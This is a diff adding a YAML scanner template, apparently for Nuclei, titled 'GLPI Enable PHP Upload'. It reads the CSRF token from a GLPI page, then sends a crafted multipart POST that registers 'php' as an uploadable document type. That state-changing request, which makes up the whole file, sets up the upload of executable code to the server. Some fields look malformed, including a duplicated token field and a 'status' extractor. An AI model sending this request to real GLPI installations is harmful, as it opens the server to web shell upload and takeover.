@@ -1,0 +1,44 @@
+id: glpi-enable-php-upload
+
+info:
+  name: GLPI Enable PHP Upload
+  author: anonymous
+  severity: info
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/front/profile.form.php"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - <meta property="glpi:csrf_token" content="
+
+    extractors:
+      - type: regex
+        internal: true
+        part: body
+        name: token
+        group: 1
+        regex:
+          - <meta\sproperty="glpi:csrf_token"\scontent="([[:alnum:]]{64})"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/front/documenttype.form.php"
+
+    headers:
+      Content-Type: "multipart/form-data; boundary=----48d91b129fc5f9f6167b0f7da257b91"
+
+    body: "------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"_glpi_csrf_token\"\r\n\r\n{{token}}\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nPHP\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"comment\"\r\n\r\n\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"icon\"\r\n\r\nai-dist.png\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"is_uploadable\"\r\n\r\n1\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"ext\"\r\n\r\nphp\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"mime\"\r\n\r\n\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"add\"\r\n\r\n1\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"_glpi_csrf_token\"\r\n\r\n{{token}}\r\n------48d91b129fc5f9f6167b0f7da257b91--\r\n"
+
+    extractors:
+      - type: status
+        status:
+          - 302
